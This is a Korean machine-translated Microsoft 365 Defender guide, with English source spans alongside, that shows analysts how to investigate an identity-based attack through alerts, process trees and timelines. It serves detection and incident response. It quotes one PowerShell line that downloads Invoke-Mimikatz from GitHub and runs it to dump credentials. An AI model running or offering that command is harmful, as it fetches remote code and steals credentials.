---
title: ID 기반 공격의 예
description: ID 기반 공격의 예제 분석을 진행합니다.
keywords: 인시던트, 경고, 조사, 상관 관계, 공격, 컴퓨터, 장치, 사용자, ID, ID, 사서함, 전자 메일, 365, Microsoft, m365, 인시던트 대응, 사이버 공격
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841009"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="9885e-104">ID 기반 공격의 예</span><span class="sxs-lookup"><span data-stu-id="9885e-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="9885e-105">**적용 대상:**</span><span class="sxs-lookup"><span data-stu-id="9885e-105">**Applies to:**</span></span>
- <span data-ttu-id="9885e-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="9885e-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="9885e-107">Microsoft Defender for Identity는 조직에서 ID를 손상하려는 악의적인 시도를 감지하는 데 도움이 될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="9885e-108">ID에 대한 Defender는 Microsoft 365 Defender와 통합되어 있기 때문에 보안 분석가가 Id를 위해 Defender에서 오는 위협(예: 의심되는 Netlogon 권한 상승 시도)을 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="9885e-109">Id에 대한 Microsoft Defender의 공격 분석</span><span class="sxs-lookup"><span data-stu-id="9885e-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="9885e-110">Microsoft 365 Defender를 사용하면 분석가가 인시던트  페이지의 경고 탭에서 검색 원본을 통해 경고를 필터링할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="9885e-111">다음 예제에서는 ID에 대한 검색 원본이 **Defender로 필터링됩니다.**</span><span class="sxs-lookup"><span data-stu-id="9885e-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="ID에 대한 Defender에 대한 검색 원본 필터링 예":::

<span data-ttu-id="9885e-113">의심되는 **overpass-the-hash** 공격 경고를 선택하면 자세한 정보가 Microsoft Cloud App Security 페이지로 이동합니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="9885e-114">경고 유형에 대해 자세히 알아보고 공격에  대한 설명과 수정 제안을 읽으면 경고 또는 공격에 대한 자세한 정보를 언제든지 찾을 수 있습니다. [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)</span><span class="sxs-lookup"><span data-stu-id="9885e-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="의심되는 오버패스- 해시 공격 경고의 예"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="9885e-116">끝점에 대한 Microsoft Defender에서 동일한 공격 조사</span><span class="sxs-lookup"><span data-stu-id="9885e-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="9885e-117">또는 분석가가 끝점용 Defender를 사용하여 끝점의 활동에 대해 자세히 배울 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="9885e-118">인시던트 큐에서 인시던트 를 선택한 다음 경고 **탭을** 선택합니다. 여기에서 검색 원본도 식별할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="9885e-119">검색된 것으로 레이블이 EDR 끝점 검색 및 응답은 끝점용 Defender입니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="9885e-120">여기에서 분석가가 검색된 경고를 EDR.</span><span class="sxs-lookup"><span data-stu-id="9885e-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Endpoint용 Defender의 끝점 감지 및 응답 예"::: 

<span data-ttu-id="9885e-122">경고 페이지에는 영향을 미치는 장치 이름, 사용자 이름, 자동 조사 상태, 경고 세부 정보 등 다양한 관련 정보가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="9885e-123">경고 스토리는 프로세스 트리의 시각적 표현을 나타냈습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="9885e-124">프로세스 트리는 경고와 관련된 상위 및 자식 프로세스의 계층적 표현입니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Endpoint용 Defender의 경고 프로세스 트리 예"::: 

<span data-ttu-id="9885e-126">각 프로세스를 확장하여 추가 세부 정보를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="9885e-127">분석가가 볼 수 있는 세부 정보는 악의적인 스크립트, 아웃바운드 연결 IP 주소 및 기타 유용한 정보의 일부로 입력된 실제 명령입니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Endpoint용 Defender의 프로세스 세부 정보 예":::
 
<span data-ttu-id="9885e-129">시간 표시 **막대에서 참조를** 선택하면 분석가가 드릴다운을 추가하여 정확한 손상 시간을 확인할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="9885e-130">끝점용 Microsoft Defender는 여러 악성 파일 및 스크립트를 검색할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="9885e-131">그러나 아웃바운드 연결, PowerShell 및 명령줄 활동에는 합법적인 사용이 많기 때문에 악의적인 파일이나 활동을 생성하기 전까지는 일부 활동이 무해한 것으로 간주됩니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="9885e-132">따라서 타임라인을 사용하면 분석가가 주변 활동과 함께 경고를 컨텍스트에 배치하여 일반적인 파일 시스템 및 사용자 활동으로 가려진 원래 공격의 원본이나 시간을 확인할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="9885e-133">이를 위해 분석가가 경고 검색 시(빨간색)에 시작하고 뒤로 스크롤하여 악의적인 활동을 주도한 원래 활동이 실제로 시작된 시기를 파악합니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="경고 검색 시 시작 예제"::: 

<span data-ttu-id="9885e-135">Windows 업데이트 연결, Windows 신뢰할 수 있는 소프트웨어 정품 인증 트래픽, Microsoft 사이트에 대한 기타 일반적인 연결, 타사 인터넷 활동, Microsoft Endpoint Configuration Manager 활동 및 기타 무해한 활동과 같은 일반적인 활동을 이해하고 구분해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="9885e-136">이렇게 하는 한 가지 방법은 시간 표시 막대 필터를 사용하는 것입니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="9885e-137">분석가가 보지 않을 모든 것을 필터링하는 동안 특정 활동을 강조할 수 있는 많은 필터가 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="9885e-138">아래 이미지에서 분석가가 네트워크 및 처리 이벤트만 보기 위해 필터링했습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="9885e-139">이를 통해 분석가가 IP 주소와의 연결을 설정한 이벤트와 메모장 네트워크 연결 및 프로세스를 볼 수 있습니다. 프로세스 트리에서도 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="악의적인 아웃바운드 연결을 메모장 방법의 예"::: 

<span data-ttu-id="9885e-141">이 특정 이벤트에서는 메모장 아웃바운드 연결을 만드는 데 사용됩니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="9885e-142">그러나 일반적으로 iexplorer.exe 웹 브라우저 활동으로 간주되어 공격자는 단순히 iexplorer.exe 사용하여 악의적인 페이로드를 다운로드하기 위한 연결을 설정하기만 합니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="9885e-143">타임라인에서 찾아야 할 또 다른 항목은 아웃바운드 연결에 PowerShell이 사용하는 것입니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="9885e-144">분석가가 악성 파일을 호스팅하는 웹 사이트에 대한 아웃바운드 연결과 같은 명령을 사용하여 성공적인 PowerShell 연결을 `IEX (New-Object Net.Webclient)` 찾아야 합니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="9885e-145">다음 예제에서는 PowerShell을 사용하여 웹 사이트에서 Mimikatz를 다운로드하고 실행했습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="9885e-146">분석가가 검색 표시줄에 키워드를 입력하여 PowerShell로 만든 이벤트만 표시하면 키워드를 빠르게 검색할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="9885e-147">다음 단계</span><span class="sxs-lookup"><span data-stu-id="9885e-147">Next step</span></span>

<span data-ttu-id="9885e-148">피싱 [조사 경로를](first-incident-path-phishing.md) 참조합니다.</span><span class="sxs-lookup"><span data-stu-id="9885e-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="9885e-149">참고 항목</span><span class="sxs-lookup"><span data-stu-id="9885e-149">See also</span></span>

- [<span data-ttu-id="9885e-150">인시던트 개요</span><span class="sxs-lookup"><span data-stu-id="9885e-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="9885e-151">인시던트 관리</span><span class="sxs-lookup"><span data-stu-id="9885e-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="9885e-152">인시던트 조사</span><span class="sxs-lookup"><span data-stu-id="9885e-152">Investigate incidents</span></span>](investigate-incidents.md)
